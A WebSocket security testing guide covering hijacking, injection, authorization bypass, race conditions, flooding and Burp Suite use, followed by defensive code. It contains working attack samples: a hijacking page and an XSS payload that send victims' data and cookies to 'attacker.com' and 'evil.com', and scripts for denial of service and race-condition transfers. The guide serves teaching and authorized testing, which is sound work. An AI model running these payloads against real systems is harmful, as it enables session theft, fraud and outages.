# WebSocket Security Testing Guide

## Introduction and Objectives

WebSocket is a communication protocol that provides full-duplex, persistent communication channels over a single TCP connection. Unlike HTTP's request-response model, WebSockets enable real-time bidirectional data flow between client and server, making them essential for chat applications, live notifications, financial trading platforms, collaborative editing tools, and gaming. The protocol was standardized as RFC 6455 in 2011 and is widely supported across all modern browsers.

From a security perspective, WebSockets introduce a distinct attack surface that many security testers overlook. The persistent connection model means that authentication and authorization decisions made at connection establishment time persist for the entire session. Cross-origin connection handling, message validation, and state management all carry unique risks compared to traditional HTTP. This guide covers the full spectrum of WebSocket security testing, from protocol-level attacks to application-layer exploitation.

**Learning Objectives:**

- Understand the WebSocket handshake protocol and its security implications
- Identify and exploit cross-site WebSocket hijacking (CSWSH) vulnerabilities
- Perform WebSocket injection and message manipulation attacks
- Test for authentication and authorization bypasses in WebSocket connections
- Execute denial-of-service attacks via WebSocket flooding
- Use Burp Suite's WebSocket proxy for intercepting and modifying WebSocket traffic
- Recommend and implement WebSocket security best practices

**Prerequisites:**

- Solid understanding of HTTP and TCP/IP fundamentals
- Familiarity with JavaScript and browser APIs
- Burp Suite Professional installed with WebSocket support enabled
- A target application with WebSocket endpoints (practice lab recommended)

## WebSocket Protocol Fundamentals

### The Handshake

A WebSocket connection begins with an HTTP upgrade request. The client sends a GET request with the `Upgrade: websocket` and `Connection: Upgrade` headers:

```http
GET /ws/chat HTTP/1.1
Host: targetapp.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://targetapp.com
Cookie: session=a3Fh9xKl...
```

The server responds with a 101 Switching Protocols status:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

After the handshake, the connection upgrades from HTTP to the WebSocket protocol. Both sides can send framed messages independently. The `Sec-WebSocket-Key` is a base64-encoded 16-byte random value, and `Sec-WebSocket-Accept` is the SHA-1 hash of the key concatenated with a fixed GUID, proving the server understands the protocol.

### WebSocket URLs

WebSocket connections use `ws://` (unencrypted, port 80) or `wss://` (TLS-encrypted, port 443) schemes. The `wss://` scheme should always be used in production to prevent eavesdropping and tampering:

```javascript
// Insecure - plaintext WebSocket
const ws = new WebSocket('ws://targetapp.com/ws/chat');

// Secure - TLS-encrypted WebSocket
const wss = new WebSocket('wss://targetapp.com/ws/chat');
```

### Subprotocols

The `Sec-WebSocket-Protocol` header allows the client to request a specific subprotocol:

```http
Sec-WebSocket-Protocol: chat, superchat
```

The server selects one and includes it in the response:

```http
Sec-WebSocket-Protocol: chat
```

Subprotocol selection can be a security-sensitive decision. If the server allows the client to dictate the subprotocol without validation, it may lead to protocol confusion attacks where the server processes messages under incorrect assumptions about the protocol rules.

## Cross-Site WebSocket Hijacking (CSWSH)

### Understanding CSWSH

Cross-Site WebSocket Hijacking is the WebSocket equivalent of CSRF. During the HTTP handshake, browsers include cookies for the target domain but do not enforce the same-origin policy on WebSocket connections by default. A malicious website can open a WebSocket connection to a target application using the victim's cookies.

The critical difference from HTTP CSRF is that a WebSocket is a persistent bidirectional channel. Once the attacker's page opens the connection, the attacker can not only send messages to the server but also read the server's responses. This makes CSWSH more dangerous than CSRF because the attacker gains full read-write access to the WebSocket channel with the victim's credentials.

### Detecting CSWSH

To test for CSWSH, examine the server's handling of the `Origin` header during the handshake:

**Step 1**: Open a legitimate WebSocket connection through Burp Proxy and capture the handshake request.

**Step 2**: Send the handshake request to Burp Repeater.

**Step 3**: Modify the `Origin` header to an attacker-controlled domain:

```http
GET /ws/chat HTTP/1.1
Host: targetapp.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://evil.com
Cookie: session=a3Fh9xKl...
```

**Step 4**: Send the request. If the server responds with `101 Switching Protocols`, it does not validate the Origin header and is vulnerable to CSWSH.

### Exploiting CSWSH

Create a malicious page that opens a WebSocket to the target and exfiltrates all messages:

```html
<!DOCTYPE html>
<html>
<body>
<script>
  var ws = new WebSocket('wss://targetapp.com/ws/chat');

  ws.onopen = function() {
    console.log('WebSocket connected');
    // Send commands as the victim
    ws.send(JSON.stringify({action: 'get_private_messages'}));
  };

  ws.onmessage = function(event) {
    // Exfiltrate server responses to attacker server
    var exfil = new Image();
    exfil.src = 'https://attacker.com/collect?data=' + encodeURIComponent(event.data);
  };

  ws.onerror = function(error) {
    console.error('WebSocket error:', error);
  };
</script>
</body>
</html>
```

This exploit opens a WebSocket using the victim's cookies, sends commands as the victim, and forwards all server responses to the attacker's server. The attacker effectively has full control over the victim's WebSocket session.

### CSWSH Impact

The impact of CSWSH depends on what the WebSocket connection allows:

- **Read sensitive data**: Intercept chat messages, notifications, personal data
- **Perform actions as the victim**: Send messages, modify settings, execute transactions
- **Maintain persistent access**: The WebSocket connection stays open as long as the victim remains on the attacker's page
- **Bypass traditional CSRF protections**: WebSocket handshake requests do not carry CSRF tokens in many implementations

## WebSocket Injection Attacks

### Message Injection

WebSocket injection occurs when user input is incorporated into WebSocket messages without proper sanitization, allowing an attacker to manipulate the message structure or inject arbitrary WebSocket frames.

Test for injection by sending crafted messages with special characters:

```json
{"user":"attacker","message":"hello\"}\r\n{\"user\":\"admin\",\"message\":\"System alert: reset your password to pwned123"}
```

If the server forwards this message to other connected clients without sanitization, the injected payload appears as a separate message from the admin user.

### Cross-Site Scripting via WebSocket Messages

WebSocket messages that are rendered in the browser without HTML encoding can lead to XSS:

```javascript
// Server broadcasts a message to all clients
ws.send(JSON.stringify({
  user: username,
  message: userMessage  // Not sanitized
}));
```

The attacker sends a malicious message:

```json
{"user":"attacker","message":"<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>"}
```

When other clients render this message in the DOM, the JavaScript executes in their context, stealing their cookies or performing actions on their behalf.

### JSON Injection

If the WebSocket protocol uses JSON, test for JSON injection by breaking out of the expected structure:

```
Normal message: {"action":"chat","message":"hello"}
Injection:      {"action":"chat","message":"hello"},"action":"admin","command":"grant_access","user":"attacker"
```

If the server parses the concatenated JSON objects sequentially, the injected command may execute.

### Binary Frame Injection

Some WebSocket applications use binary frames. Test for injection in binary protocols by manipulating the binary data:

```javascript
var ws = new WebSocket('wss://targetapp.com/ws/binary');
ws.binaryType = 'arraybuffer';

ws.onopen = function() {
  // Craft a binary payload that exploits a parsing vulnerability
  var buffer = new ArrayBuffer(8);
  var view = new DataView(buffer);
  // Manipulate protocol fields
  view.setUint32(0, 0xDEADBEEF);  // Command code
  view.setUint32(4, 0x00000001);  // Admin privilege level
  ws.send(buffer);
};
```

## Authentication and Authorization Bypass

### Authentication at Handshake Time

Many WebSocket implementations authenticate only during the initial HTTP handshake. Once the connection is established, all messages are trusted. This creates several attack vectors:

**Token Theft and Replay**: If the authentication token is passed as a URL parameter:

```
wss://targetapp.com/ws/chat?token=eyJhbGciOiJIUzI1NiJ9...
```

An attacker who obtains this token (via logs, Referer headers, or XSS) can open their own authenticated WebSocket connection.

**Session Fixation**: If the server accepts a session ID via the WebSocket URL and does not validate it against the session cookie, an attacker may be able to hijack another user's WebSocket session:

```
wss://targetapp.com/ws/chat?sessionId=victim_session_id
```

### Authorization Bypass Within WebSocket

Even when authentication is correct, the server may fail to authorize individual messages. Test whether you can perform actions reserved for other users:

```json
// Normal message - user can only access their own data
{"action":"get_messages","user_id":"12345"}

// Authorization bypass - accessing another user's data
{"action":"get_messages","user_id":"1"}
```

If the server does not validate that the authenticated user has permission to access the requested `user_id`, an authorization bypass exists.

### Role Escalation via WebSocket

Test whether you can change your role or permissions through WebSocket messages:

```json
// Normal user message
{"action":"update_profile","display_name":"attacker"}

// Role escalation attempt
{"action":"update_profile","display_name":"attacker","role":"admin"}
```

If the server processes the extra `role` field without authorization checks, the attacker gains admin privileges.

## Message Manipulation and State Attacks

### Race Conditions via WebSocket

WebSockets enable rapid message delivery, which can expose race conditions. Send multiple messages in quick succession to exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities:

```javascript
var ws = new WebSocket('wss://targetapp.com/ws/bank');

ws.onopen = function() {
  // Send 100 transfer requests simultaneously
  for (var i = 0; i < 100; i++) {
    ws.send(JSON.stringify({
      action: 'transfer',
      amount: 1000,
      recipient: 'attacker_account'
    }));
  }
};
```

If the server checks the balance before deducting but processes all 100 requests before any deduction occurs, the attacker may extract far more than their actual balance.

### Replaying Messages

Capture legitimate WebSocket messages and replay them with modified parameters. Burp Suite's WebSocket history allows you to right-click any message and send it to the WebSocket Repeater:

1. Connect to the WebSocket endpoint through Burp Proxy
2. Perform a normal action (e.g., send a chat message)
3. Find the message in Burp's WebSocket history
4. Send it to WebSocket Repeater
5. Modify the parameters and resend

### Manipulating Message Order

Some applications assume messages arrive in a specific order. Test whether sending messages out of order causes unexpected behavior:

```javascript
// Skip the "join_room" step and go straight to "send_message"
ws.send(JSON.stringify({action: 'send_message', room: 'admin_channel', message: 'hello'}));
```

## Denial of Service via WebSocket Flooding

### Connection Flooding

Open many concurrent WebSocket connections to exhaust server resources:

```python
import asyncio
import websockets

async def flood_connection(uri, connection_id):
    try:
        async with websockets.connect(uri) as ws:
            print(f"Connection {connection_id} established")
            # Keep the connection open
            while True:
                await asyncio.sleep(60)
    except Exception as e:
        print(f"Connection {connection_id} failed: {e}")

async def main():
    uri = "wss://targetapp.com/ws/chat"
    tasks = [flood_connection(uri, i) for i in range(10000)]
    await asyncio.gather(*tasks)

asyncio.run(main())
```

### Message Flooding

Send a high volume of messages to overwhelm the server's message processing:

```javascript
var ws = new WebSocket('wss://targetapp.com/ws/chat');

ws.onopen = function() {
  // Send 10,000 messages as fast as possible
  for (var i = 0; i < 10000; i++) {
    ws.send(JSON.stringify({
      action: 'message',
      text: 'A'.repeat(10000)  // Large payload
    }));
  }
};
```

### Resource Exhaustion via Large Frames

WebSocket supports frames up to 2^64 bytes. Send extremely large messages to exhaust server memory:

```python
import asyncio
import websockets

async def large_frame_attack():
    uri = "wss://targetapp.com/ws/echo"
    async with websockets.connect(uri) as ws:
        # Send a 100 MB message
        large_payload = 'A' * (100 * 1024 * 1024)
        await ws.send(large_payload)
        print("Large frame sent")

asyncio.run(large_frame_attack())
```

### Fragmentation Attacks

WebSocket allows message fragmentation. Send many small fragments without completing the message to hold server resources:

```python
import asyncio
import websockets

async def fragment_attack():
    uri = "wss://targetapp.com/ws/echo"
    async with websockets.connect(uri) as ws:
        # Start many fragmented messages without completing them
        for i in range(1000):
            # Send fragment with FIN bit not set
            await ws.send(f"fragment_{i}_", partial=True)
        print("Fragments sent, server waiting for completion")
        await asyncio.sleep(300)  # Hold connections open

asyncio.run(fragment_attack())
```

## Testing with Burp WebSocket Proxy

### Intercepting WebSocket Traffic

Burp Suite intercepts and logs all WebSocket traffic passing through its proxy. To view WebSocket messages:

1. Configure your browser to use Burp as a proxy (default: `127.0.0.1:8080`)
2. Navigate to the target application and trigger WebSocket connections
3. Open Burp's **WebSocket history** tab under the Proxy section
4. All WebSocket messages (both client-to-server and server-to-client) are logged with timestamps

### Modifying WebSocket Messages

Use Burp's **WebSocket Repeater** to modify and resend WebSocket messages:

1. Right-click a message in WebSocket history
2. Select "Send to WebSocket Repeater" (or use Ctrl+R)
3. Edit the message content in the Repeater tab
4. Click "Send" to transmit the modified message
5. Observe the server's response in the Repeater window

### Setting Up WebSocket Intercept Rules

Configure Burp to automatically intercept specific WebSocket messages:

1. Go to **Proxy > Options > WebSocket history**
2. Under "Intercept WebSocket messages," create rules:
   - Intercept client-to-server messages containing "admin"
   - Intercept server-to-client messages containing "password"
   - Intercept messages larger than 10,000 bytes
3. Burp pauses matching messages for manual review before forwarding

### Using Burp Intruder for WebSocket Testing

Send a WebSocket message to Burp Intruder for automated fuzzing:

1. Capture a WebSocket message in history
2. Right-click and select "Send to Intruder"
3. Configure payload positions within the message
4. Set payload lists (fuzz strings, SQL injection payloads, XSS payloads)
5. Configure attack speed to avoid triggering rate limiting
6. Analyze results for anomalous server responses

### Automatic WebSocket Message Manipulation

Create a Burp extension or use the Match and Replace feature to automatically modify WebSocket traffic:

1. Go to **Proxy > Options > Match and Replace**
2. Add rules for WebSocket messages:
   - Replace `"role":"user"` with `"role":"admin"` in client-to-server messages
   - Replace error messages in server-to-client messages for analysis
3. Test whether the automated modifications affect server behavior

## Hands-On Practice and Exercises

### Exercise 1: CSWSH Detection and Exploitation

**Objective**: Identify and exploit a Cross-Site WebSocket Hijacking vulnerability.

**Setup**: Deploy a vulnerable chat application with WebSocket communication that does not validate the Origin header.

**Steps**:
1. Connect to the application through Burp Proxy
2. Identify the WebSocket handshake request in HTTP history
3. Send the request to Burp Repeater
4. Change the `Origin` header to `https://evil.com`
5. Verify the server accepts the connection (101 response)
6. Create a CSWSH exploit page that opens the WebSocket and logs all messages
7. Open the exploit page while authenticated as a different user
8. Observe that the exploit page receives the victim's messages

**Expected Result**: Successful hijacking of another user's WebSocket session through cross-origin connections.

### Exercise 2: WebSocket Message Injection

**Objective**: Inject crafted messages to manipulate the WebSocket communication protocol.

**Setup**: Use a vulnerable real-time auction application with WebSocket bidding.

**Steps**:
1. Connect to the application and identify the bidding WebSocket messages
2. Capture a normal bid message: `{"action":"bid","item_id":42,"amount":100}`
3. Send the message to WebSocket Repeater
4. Attempt to submit a negative bid: `{"action":"bid","item_id":42,"amount":-1}`
5. Attempt to submit a bid for another item: `{"action":"bid","item_id":1,"amount":1}`
6. Attempt to inject multiple JSON objects in a single message
7. Document which injections succeed and why

**Expected Result**: Understanding of input validation weaknesses in WebSocket message processing.

### Exercise 3: Authentication Bypass via WebSocket

**Objective**: Bypass authentication or authorization checks within the WebSocket channel.

**Setup**: Use a practice application where WebSocket messages control access to resources.

**Steps**:
1. Connect as a regular user and observe normal WebSocket traffic
2. Identify messages that request user-specific data
3. Modify the user identifier in messages to target other users
4. Test for role escalation by adding privilege fields to messages
5. Test whether disconnected sessions can be reconnected by replaying handshake tokens

**Expected Result**: Ability to access or modify data belonging to other users through the WebSocket.

### Exercise 4: WebSocket DoS Testing

**Objective**: Demonstrate resource exhaustion vulnerabilities in WebSocket handling.

**Setup**: Use a local test environment with a vulnerable WebSocket server.

**Steps**:
1. Write a Python script to open 1,000 concurrent WebSocket connections
2. Monitor server resource usage (CPU, memory, file descriptors)
3. Measure the maximum number of connections the server handles
4. Test message flooding by sending 10,000 messages per second
5. Test large frame handling with progressively larger messages
6. Document the server's breaking point and recovery behavior

**Expected Result**: Identification of the server's resource limits and exhaustion thresholds.

### Exercise 5: Full WebSocket Security Assessment

**Objective**: Conduct a comprehensive security assessment of a WebSocket-enabled application.

**Setup**: Select a target application with significant WebSocket functionality.

**Steps**:
1. Map all WebSocket endpoints and their purposes
2. Test CSWSH for each endpoint by manipulating the Origin header
3. Test authentication: token handling, session validation, reconnection security
4. Test authorization: access control for each message type
5. Test input validation: injection, XSS, JSON manipulation
6. Test rate limiting and DoS resistance
7. Test encryption: verify `wss://` is enforced, check certificate validity
8. Compile findings into a security assessment report

**Expected Result**: A comprehensive WebSocket security assessment report with prioritized findings and remediation guidance.

## Defense Mechanisms and Best Practices

### Origin Header Validation

Always validate the `Origin` header during the WebSocket handshake to prevent CSWSH:

```javascript
// Node.js example
const WebSocketServer = require('ws').Server;
const wss = new WebSocketServer({ port: 8080 });

wss.on('connection', function connection(ws, req) {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://targetapp.com', 'https://app.targetapp.com'];

  if (!origin || !allowedOrigins.includes(origin)) {
    ws.close(4003, 'Forbidden origin');
    return;
  }

  // Proceed with authenticated connection
});
```

### Per-Message Authentication

Do not rely solely on handshake-time authentication. Validate the user's session and permissions for sensitive operations:

```javascript
ws.on('message', function incoming(message) {
  const data = JSON.parse(message);

  // Verify the user's session is still valid
  if (!isSessionValid(ws.sessionToken)) {
    ws.close(4001, 'Session expired');
    return;
  }

  // Check authorization for the specific action
  if (!isAuthorized(ws.userId, data.action, data.resource)) {
    ws.send(JSON.stringify({ error: 'Unauthorized action' }));
    return;
  }

  // Process the message
  handleMessage(ws, data);
});
```

### Input Validation and Sanitization

Treat all WebSocket messages as untrusted input. Validate message structure, sanitize content, and encode output:

```javascript
function validateMessage(data) {
  // Schema validation
  if (!data.action || typeof data.action !== 'string') return false;
  if (!ALLOWED_ACTIONS.includes(data.action)) return false;

  // Length limits
  if (data.message && data.message.length > MAX_MESSAGE_LENGTH) return false;

  // Content sanitization
  if (data.message) {
    data.message = sanitizeHtml(data.message);  // Prevent XSS
  }

  return true;
}
```

### Rate Limiting and Connection Management

Implement rate limiting per user and per connection:

```javascript
const rateLimiter = {
  connections: new Map(),

  check(userId, action) {
    const key = `${userId}:${action}`;
    const now = Date.now();
    const record = this.connections.get(key) || { count: 0, windowStart: now };

    if (now - record.windowStart > RATE_WINDOW_MS) {
      record.count = 0;
      record.windowStart = now;
    }

    record.count++;
    this.connections.set(key, record);

    return record.count <= RATE_LIMIT;
  }
};
```

### Enforce Encrypted Connections

Always use `wss://` in production and reject `ws://` connections:

```javascript
// Reject unencrypted WebSocket connections in production
if (process.env.NODE_ENV === 'production') {
  const wss = new WebSocketServer({
    port: 443,
    ssl: true,
    cert: fs.readFileSync('/path/to/cert.pem'),
    key: fs.readFileSync('/path/to/key.pem')
  });
}
```

## References and Resources

### Standards and Specifications

- **RFC 6455 - The WebSocket Protocol**: https://datatracker.ietf.org/doc/html/rfc6455
- **W3C WebSocket API Specification**: https://websockets.spec.whatwg.org/
- **OWASP WebSocket Security Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- **MDN: WebSocket API**: https://developer.mozilla.org/en-US/docs/Web/API/WebSocket

### Tools

- **Burp Suite Professional**: WebSocket proxy, interception, and fuzzing (https://portswigger.net/burp)
- **OWASP ZAP**: WebSocket add-on for open-source testing (https://www.zaproxy.org/)
- **wscat**: Command-line WebSocket client for quick testing (`npm install -g wscat`)
- **websocat**: Multi-platform WebSocket command-line client (https://github.com/vi/websocat)
- **WebSocket King Client**: GUI-based WebSocket testing tool

### Practice Labs

- **PortSwigger Web Security Academy - WebSocket Attacks**: https://portswigger.net/web-security/websockets
- **OWASP SecureChat**: Deliberately vulnerable chat application (https://github.com/)
- **TryHackMe - WebSocket Security Room**: https://tryhackme.com/
- **HackTheBox - WebSocket Challenges**: Various WebSocket-focused challenges

### Books and Research Papers

- **The Web Application Hacker's Handbook** by Dafydd Stuttard and Marcus Pinto - Chapter on WebSocket security
- **OWASP Testing Guide v4 - WebSocket Testing**: https://owasp.org/www-project-web-security-testing-guide/
- **"Abusing WebSockets for Fun and Profit"** - Black Hat presentation on advanced WebSocket exploitation
- **Chrome Security Team WebSocket Research**: Cross-origin WebSocket behavior analysis

### Additional Reading

- **PortSwigger Research - WebSocket Smuggling**: https://portswigger.net/research
- **HackerOne Hacktivity**: Search for WebSocket-related disclosed reports
- **Cure53 WebSocket Audit Reports**: Real-world WebSocket security audit findings
- **HTML5 Security Cheat Sheet**: Comprehensive HTML5 attack vectors including WebSocket-specific risks
